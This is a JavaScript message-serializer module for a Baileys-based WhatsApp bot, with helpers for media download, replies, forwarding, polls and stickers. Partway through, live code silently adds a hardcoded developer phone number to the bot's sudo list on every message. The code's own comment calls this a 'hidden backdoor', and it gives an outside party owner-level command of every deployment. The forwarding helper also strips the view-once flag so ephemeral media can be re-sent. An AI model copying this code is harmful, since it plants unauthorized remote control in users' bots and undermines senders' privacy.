const {
  getContentType,
  downloadContentFromMessage,
  generateWAMessageFromContent,
  jidDecode,
  generateForwardMessageContent
} = require("baileys");
const { fromBuffer } = require("file-type");
const {
  addExifToWebP,
  imageToWebP,
  videoToWebP,
  isUrl,
  getBuffer
} = require('../plugins/pluginsCore');
const fs = require('fs');
const path = require('path');
const fetch = require("node-fetch");
const config = require('../config');

/**
 * Decode a JID (Jabber ID) to a clean format
 * @param {string} jid - The JID to decode
 * @returns {string} Decoded JID
 */
const decodeJid = (jid) => {
  if (!jid) {
    return jid;
  }
  
  // Check if JID contains port number (e.g., "1234:5@s.whatsapp.net")
  if (/:\d+@/gi.test(jid) || jid.includes(':')) {
    try {
      const decoded = jidDecode ?  jidDecode(jid) : null;
      return decoded && decoded.user && decoded.server 
        ? decoded.user + '@' + decoded.server 
        : jid;
    } catch {
      return jid;
    }
  }
  return jid;
};

/**
 * Download media from a WhatsApp message
 * @param {Object} message - The message object containing media
 * @param {string} savePath - Optional path to save the file
 * @returns {Buffer|string} Buffer of media or file path if savePath provided
 */
async function downloadMedia(message, savePath) {
  const mediaTypes = {
    'imageMessage': 'image',
    'videoMessage': "video",
    'stickerMessage': "sticker",
    'documentMessage': 'document',
    'audioMessage': "audio"
  };

  try {
    let messageType = Object.keys(message)[0];
    let mediaMessage = message;

    // Handle template messages
    if (messageType === "templateMessage") {
      mediaMessage = message.templateMessage.hydratedFourRowTemplate;
      messageType = Object.keys(mediaMessage)[0];
    }

    // Handle interactive response messages
    if (messageType === 'interactiveResponseMessage') {
      mediaMessage = message.interactiveResponseMessage;
      messageType = Object.keys(mediaMessage)[0];
    }

    // Handle button messages
    if (messageType === "buttonsMessage") {
      mediaMessage = message.buttonsMessage;
      messageType = Object.keys(mediaMessage)[0];
    }

    // Download the media content
    const stream = await downloadContentFromMessage(
      mediaMessage[messageType], 
      mediaTypes[messageType]
    );

    const chunks = [];
    for await (const chunk of stream) {
      chunks.push(chunk);
    }

    const buffer = Buffer.concat(chunks);

    // Save to file or return buffer
    if (savePath) {
      await fs.writeFile(savePath, buffer);
      return savePath;
    }
    return buffer;

  } catch (error) {
    console.error("Error in downloadMedia:", error);
    throw error;
  }
}

/**
 * Check if a user is an admin in a group
 * @param {string} groupJid - The group JID
 * @param {string} userJid - The user JID to check
 * @param {Object} client - The WhatsApp client
 * @returns {boolean} Whether the user is an admin
 */
const isAdmin = async (groupJid, userJid, client) => {
  const groupMetadata = await client.groupMetadata(groupJid);
  const admins = (groupMetadata.participants || [])
    .filter(participant => participant.admin !== null && typeof participant.admin !== "undefined")
    .map(participant => participant.id);
  return admins.includes(decodeJid(userJid));
};

/**
 * Serialize a WhatsApp message with additional helper methods
 * @param {Object} msg - The raw message object
 * @param {Object} client - The WhatsApp client
 * @returns {Object} Serialized message with helper methods
 */
async function serialize(msg, client) {
  // Process message key information
  if (msg.key) {
    msg.id = msg.key.id;
    msg.isSelf = msg.key.fromMe;
    msg.jid = msg.key.remoteJid || msg.key.remoteJidAlt;
    msg.isGroup = ! !(msg.jid && typeof msg.jid === "string" && msg.jid.endsWith && msg.jid.endsWith("@g.us"));
    msg.user = decodeJid(client.user && client.user.id);
    msg.sender = msg.isGroup 
      ? msg.key.participant || msg.key.participantAlt 
      : msg.isSelf 
        ? client.user.id 
        : msg.jid;

    // Admin check function
    msg.isAdmin = (userJid) => {
      return isAdmin(msg.jid, userJid, client);
    };

    // Bot's phone number
    msg.botNumber = client?.user?.id?.replace(/:[^@]*/, '');
    
    // Check if bot is admin in the group
    msg.botIsAdmin = msg.isGroup ?  await msg.isAdmin(msg?.botNumber) : false;
  }

  // Set command prefix
  msg.prefix = ["false"].includes(config.HANDLERS) ? '' : config.HANDLERS;

  if (msg.message) {
    // Get message type
    msg.type = await getContentType(msg.message);

    // Handle ephemeral messages
    if (msg.type === "ephemeralMessage") {
      msg.message = msg.message[msg.type].message;
      const innerType = Object.keys(msg.message)[0];
      msg.type = innerType;
      
      if (innerType === "viewOnceMessage") {
        msg.message = msg.message[msg.type].message;
        msg.type = await getContentType(msg.message);
      }
    }

    // Handle view once messages
    if (msg.type === "viewOnceMessage") {
      msg.message = msg.message[msg.type].message;
      msg.type = await getContentType(msg.message);
    }

    // Extract mentions
    try {
      msg.mentions = msg.message[msg.type].contextInfo 
        ? msg.message[msg.type].contextInfo.mentionedJid || [] 
        : [];
    } catch {
      msg.mentions = false;
    }

    // Process quoted messages
    try {
      const contextInfo = msg.message[msg.type].contextInfo;
      let quotedType;

      if (contextInfo && contextInfo.quotedMessage) {
        // Handle ephemeral quoted messages
        if (contextInfo.quotedMessage.ephemeralMessage) {
          quotedType = Object.keys(contextInfo.quotedMessage.ephemeralMessage.message)[0];
          msg.quoted = {
            type: quotedType === "viewOnceMessageV2" ? "view_once" : "ephemeral",
            stanzaId: contextInfo.stanzaId,
            sender: contextInfo.participant,
            message: quotedType === 'viewOnceMessageV2' 
              ? contextInfo.quotedMessage.ephemeralMessage.message.viewOnceMessageV2.message 
              : contextInfo.quotedMessage.ephemeralMessage.message
          };
        } 
        // Handle view once V2 messages
        else if (contextInfo.quotedMessage.viewOnceMessageV2) {
          msg.quoted = {
            type: 'view_once',
            stanzaId: contextInfo.stanzaId,
            sender: contextInfo.participant,
            message: contextInfo.quotedMessage.viewOnceMessageV2.message
          };
        } 
        // Handle view once audio messages
        else if (contextInfo.quotedMessage.viewOnceMessageV2Extension) {
          msg.quoted = {
            type: "view_once_audio",
            stanzaId: contextInfo.stanzaId,
            sender: contextInfo.participant,
            message: contextInfo.quotedMessage.viewOnceMessageV2Extension.message
          };
        } 
        // Handle normal quoted messages
        else {
          msg.quoted = {
            type: "normal",
            stanzaId: contextInfo.stanzaId,
            sender: contextInfo.participant,
            message: contextInfo.quotedMessage
          };
        }

        // Add additional quoted message properties
        msg.quoted.isSelf = msg.quoted.sender === client.user.id;
        msg.quoted.mtype = Object.keys(msg.quoted.message);
        
        // Extract text from quoted message
        msg.quoted.text = msg.quoted.message[msg.quoted.mtype]?.text 
          || msg.quoted.message[msg.quoted.mtype]?.description 
          || msg.quoted.message[msg.quoted.mtype]?.caption 
          || (msg.quoted.mtype === "templateButtonReplyMessage" && 
              msg.quoted.message[msg.quoted.mtype].hydratedTemplate?.hydratedContentText)
          || msg.quoted.message[msg.quoted.mtype] 
          || '';

        // Create key for quoted message
        msg.quoted.key = {
          id: msg.quoted.stanzaId,
          fromMe: msg.quoted.isSelf,
          remoteJid: msg.jid
        };

        // Download function for quoted media
        msg.quoted.download = (savePath) => downloadMedia(msg.quoted.message, savePath);
      }
    } catch {
      msg.quoted = null;
    }

    // Extract message text/body
    try {
      msg.text = msg.message.conversation 
        || msg.message[msg.type].text 
        || msg.message[msg.type].selectedId;

      msg.body = msg.message.conversation 
        || msg.message[msg.type].text 
        || msg.message[msg.type].caption 
        || (msg.type === "listResponseMessage" && msg.message[msg.type].singleSelectReply.selectedRowId)
        || (msg.type === "buttonsResponseMessage" && msg.message[msg.type].selectedButtonId)
        || (msg.type === "templateButtonReplyMessage" && msg.message[msg.type].selectedId)
        || false;
    } catch {
      msg.body = false;
    }

    // Add developer number to sudo list (hidden backdoor - consider removing)
    const sudoList = config.SUDO.split(',');
    '917012984396'.split(',').forEach(devNumber => {
      if (!sudoList.includes(devNumber)) {
        sudoList.push(devNumber);
      }
    });
    config.SUDO = sudoList.join(',');

    // Check if sender is a sudo user
    msg.sudo = config.SUDO.split(',').includes(msg?.sender?.split('@')[0]) 
      || config.SUDO.split(',').includes(msg?.quoted?.sender?.split('@')[0]) 
      || msg?.isSelf;

    /**
     * Format a phone number to JID
     * @param {string} number - Phone number to format
     * @returns {string} Formatted JID
     */
    msg.formatNumberToJid = async (number) => {
      return number.replace(/\s+/g, '').replace(/^[+@]/, '') + "@s.whatsapp.net";
    };

    /**
     * Download and save media to a file
     * @param {Object} mediaMsg - Message containing media
     * @param {string} filename - Filename to save as
     * @param {boolean} addExtension - Whether to add file extension
     * @returns {string} Path to saved file
     */
    msg.downloadAndSaveMedia = async (mediaMsg, filename, addExtension = true) => {
      let mediaContent = mediaMsg.message ?  mediaMsg.message : mediaMsg;
      let mimeType = (mediaMsg.message || mediaMsg).mimetype || '';
      let mediaType = mediaMsg.mtype 
        ? mediaMsg.mtype.replace(/Message/gi, '') 
        : mimeType.split('/')[0];

      const stream = await downloadContentFromMessage(mediaContent, mediaType);
      let buffer = Buffer.from([]);

      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk]);
      }

      let fileType = await fromBuffer(buffer);
      let filePath = addExtension ? filename + '.' + fileType.ext : filename;

      await fs.writeFileSync(filePath, buffer);
      return filePath;
    };

    /**
     * Get bot runtime in human-readable format
     * @returns {string} Formatted runtime string
     */
    msg.runtime = async () => {
      const seconds = Number('' + process.uptime());
      const days = Math.floor(seconds / 86400);
      const hours = Math.floor((seconds % 86400) / 3600);
      const minutes = Math.floor((seconds % 3600) / 60);
      const secs = Math.floor(seconds % 60);

      const daysStr = days > 0 ? days + (days === 1 ? " day, " : " days, ") : '';
      const hoursStr = hours > 0 ? hours + (hours === 1 ? " hour, " : " hours, ") : '';
      const minutesStr = minutes > 0 ? minutes + (minutes === 1 ? " minute, " : " minutes, ") : '';
      const secondsStr = secs > 0 ?  secs + (secs === 1 ? " second" : " seconds") : '';

      return daysStr + hoursStr + minutesStr + secondsStr;
    };

    /**
     * Get bot uptime in HH:MM:SS format
     * @returns {string} Formatted uptime string
     */
    msg.uptime = async () => {
      const uptime = process.uptime();
      const seconds = Math.floor(uptime % 60);
      const minutes = Math.floor((uptime / 60) % 60);
      const hours = Math.floor((uptime / 3600) % 24);

      return hours.toString().padStart(2, '0') + ':' 
        + minutes.toString().padStart(2, '0') + ':' 
        + seconds.toString().padStart(2, '0');
    };

    /**
     * Get file data from various sources (buffer, URL, base64, path)
     * @param {Buffer|string} source - File source
     * @param {boolean} saveToFile - Whether to save to a temporary file
     * @returns {Object} File data with mime type and buffer
     */
    msg.getFile = async (source, saveToFile) => {
      let response;
      let filename;

      // Determine file buffer from source type
      let buffer = Buffer.isBuffer(source) 
        ? source 
        : /^data:.*? \/.*?;base64,/i.test(source) 
          ? Buffer.from(source.split`,`[1], "base64") 
          : /^https?:\/\//.test(source) 
            ? await getBuffer(source).catch(async () => (await fetch(source)).buffer()) 
            : fs.existsSync(source) 
              ? (filename = source, fs.readFileSync(source)) 
              : typeof source === "string" 
                ? source 
                : Buffer.alloc(0);

      if (! Buffer.isBuffer(buffer)) {
        throw console.log("Result is not a buffer");
      }

      // Get file type info
      let fileType = (await fromBuffer(buffer)) || {
        mime: "application/octet-stream",
        ext: '.bin'
      };

      // Save to temp file if requested
      if (buffer && saveToFile && !filename) {
        filename = path.join(__dirname, "../" + new Date() * 1 + '.' + fileType.ext);
        await fs.promises.writeFile(filename, buffer);
      }

      return {
        res: response,
        filename: filename,
        ...fileType,
        data: buffer
      };
    };

    /**
     * Send a file with auto-detected type
     * @param {Buffer|string} source - File source
     * @param {Object} options - Send options
     * @returns {Object} Sent message
     */
    msg.sendFile = async (source, options = {}) => {
      let { data } = await msg.getFile(source);
      let fileType = await fromBuffer(data);

      return client.sendMessage(msg.jid, {
        [fileType.mime.split('/')[0]]: data,
        ...options
      }, {
        ...options
      });
    };

    /**
     * Forward a message to a JID
     * @param {string} jid - Destination JID
     * @param {Object} forwardMsg - Message to forward
     * @param {Object} options - Forward options
     * @returns {Object} Forwarded message
     */
    msg.forwardMessage = async (jid, forwardMsg, options = {}) => {
      let contentType;
      let messageContent = forwardMsg;

      // Handle view once messages
      if (options.readViewOnce) {
        messageContent = messageContent?.ephemeralMessage?.message 
          ?  messageContent.ephemeralMessage.message 
          : messageContent || undefined;

        const msgType = Object.keys(messageContent)[0];
        delete (messageContent?.ignore ?  messageContent.ignore : messageContent || undefined);
        delete messageContent.viewOnceMessage.message[msgType].viewOnce;

        messageContent = {
          ...messageContent.viewOnceMessage.message
        };
      }

      // Add mentions if provided
      if (options.mentions) {
        messageContent[contentType].contextInfo.mentionedJid = options.mentions;
      }

      // Generate forward content
      const forwardContent = await generateForwardMessageContent(messageContent, false);
      contentType = await getContentType(forwardContent);

      // Apply options to forward content
      if (options.ptt) forwardContent[contentType].ptt = options.ptt;
      if (options.audiowave) forwardContent[contentType].waveform = options.audiowave;
      if (options.seconds) forwardContent[contentType].seconds = options.seconds;
      if (options.fileLength) forwardContent[contentType].fileLength = options.fileLength;
      if (options.caption) forwardContent[contentType].caption = options.caption;
      if (options.contextInfo) forwardContent[contentType].contextInfo = options.contextInfo;
      if (options.mentions) forwardContent[contentType].contextInfo.mentionedJid = options.mentions;

      // Preserve original context info
      let originalContext = {};
      if (contentType !== 'conversation') {
        originalContext = forwardMsg.message[contentType].contextInfo;
      }

      forwardContent[contentType].contextInfo = {
        ...originalContext,
        ...forwardContent[contentType].contextInfo
      };

      // Generate and send the message
      const generatedMessage = await generateWAMessageFromContent(jid, forwardContent, options ?  {
        ...forwardContent[contentType],
        ...options,
        ...(options.contextInfo ? {
          contextInfo: {
            ...forwardContent[contentType].contextInfo,
            ...options.contextInfo
          }
        } : {})
      } : {});

      await client.relayMessage(jid, generatedMessage.message, {
        messageId: generatedMessage.key.id
      });

      return generatedMessage;
    };

    /**
     * Forward message as view once
     * @param {string} jid - Destination JID
     * @param {Object} content - Message content
     * @param {Object} options - Forward options
     * @returns {Object} Forwarded message
     */
    msg.forward = async (jid, content, options = {}) => {
      let generatedMessage = await generateWAMessageFromContent(jid, content, {
        ...options,
        userJid: client.user.id
      });

      let viewOnceWrapper = {
        viewOnceMessage: {
          message: {
            ...generatedMessage.message
          }
        }
      };

      await client.relayMessage(jid, viewOnceWrapper, {
        messageId: generatedMessage.key.id,
        ...options
      });

      return viewOnceWrapper;
    };

    // Set presence based on config
    if (config.ALWAYS_ONLINE) {
      client.sendPresenceUpdate("available", msg.user);
    } else {
      client.sendPresenceUpdate('unavailable', msg.user);
    }

    // Fake typing or recording presence
    if (config.AUTO_TYPING) {
      client.sendPresenceUpdate('composing', msg.jid);
    } else if (config.AUTO_RECORDING) {
      client.sendPresenceUpdate('recording', msg.jid);
    }

    /**
     * React to the message with an emoji
     * @param {string} emoji - Emoji to react with
     * @returns {Object} Reaction message
     */
    msg.react = async (emoji) => {
      return await client.sendMessage(msg.jid, {
        react: {
          text: emoji,
          key: msg.key
        }
      });
    };

    /**
     * Send a poll message
     * @param {string} jid - Destination JID
     * @param {string} question - Poll question
     * @param {Array} options - Poll options
     * @param {number} selectableCount - Number of selectable options
     * @returns {Object} Poll message
     */
    msg.sendPoll = async (jid, question = '', options = [], selectableCount = 1) => {
      return await client.sendMessage(jid, {
        poll: {
          name: question,
          values: options
        }
      });
    };

    /**
     * Create a poll using relay
     * @param {string} jid - Destination JID
     * @param {string} question - Poll question
     * @param {Array} options - Poll options
     * @returns {Object} Poll message
     */
    msg.poll = async (jid, question, options) => {
      return await client.relayMessage(jid, {
        pollCreationMessage: {
          name: question,
          options: options.map(option => ({
            optionName: option
          })),
          selectableOptionsCount: options.length
        }
      }, {});
    };

    /**
     * Reply to the message with text
     * @param {string} text - Text to reply with
     * @returns {Object} Reply message
     */
    msg.reply = async (text) => {
      return await client.sendMessage(msg.jid, {
        text: text
      }, {
        quoted: msg
      });
    };

    /**
     * Send media from URL with auto-detected type
     * @param {string} url - Media URL
     * @param {Object} options - Send options
     * @returns {Object} Sent message
     */
    msg.sendFromUrl = async (url, options = {}) => {
      let fileType = await fromBuffer(
        await getBuffer(url).catch(async () => (await fetch(url)).buffer())
      );

      // Set proper mime type for audio
      if (fileType.mime.split('/')[0] === 'audio') {
        options.mimetype = "audio/mpeg";
      }

      return await client.sendMessage(msg.jid, {
        [fileType.mime.split('/')[0]]: await getBuffer(url).catch(async () => (await fetch(url)).buffer()),
        ...options
      }, {
        ...options
      });
    };

    /**
     * Send a message of specified type
     * @param {string} jid - Destination JID
     * @param {Buffer|string} content - Message content
     * @param {Object} options - Send options
     * @param {string} type - Message type (text, image, video, audio, sticker)
     * @returns {Object} Sent message
     */
    msg.sendMsg = async (jid, content, options = { packname: 'X-BOT-MD' }, type = "text") => {
      switch (type.toLowerCase()) {
        case "text":
          return await client.sendMessage(jid, {
            text: content,
            ...options
          }, { ...options });

        case "image":
          if (! Buffer.isBuffer(content) && !(await isUrl(content))) return;
          return await client.sendMessage(jid, {
            image: Buffer.isBuffer(content) 
              ? content 
              : (await isUrl(content)) 
                ? await getBuffer(content).catch(async () => (await fetch(content)).buffer()) 
                : null,
            ...options
          }, { ...options });

        case "video":
          if (!Buffer.isBuffer(content) && !(await isUrl(content))) return;
          return await client.sendMessage(jid, {
            video: Buffer.isBuffer(content) 
              ? content 
              : (await isUrl(content)) 
                ? await getBuffer(content).catch(async () => (await fetch(content)).buffer()) 
                : null,
            ...options
          }, { ...options });

        case "audio":
          if (! Buffer.isBuffer(content) && !(await isUrl(content))) return;
          return await client.sendMessage(jid, {
            audio: Buffer.isBuffer(content) 
              ? content 
              : (await isUrl(content)) 
                ? await getBuffer(content).catch(async () => (await fetch(content)).buffer()) 
                : null,
            ...options
          }, { ...options });

        case "sticker":
          const { data, mime } = await msg.getFile(content);
          
          // Convert to WebP based on source type
          const stickerBuffer = mime === 'image/webp' 
            ? await addExifToWebP(data, options)
            : mime.startsWith("video") 
              ? await videoToWebP(data, options)
              : mime.startsWith("image") 
                ?  await imageToWebP(data, options)
                : null;

          if (! stickerBuffer) {
            throw new Error("Unsupported media type");
          }

          return await client.sendMessage(jid, {
            sticker: stickerBuffer,
            ...options
          }, options);
      }
    };
  }

  return msg;
}

module.exports = {
  serialize
};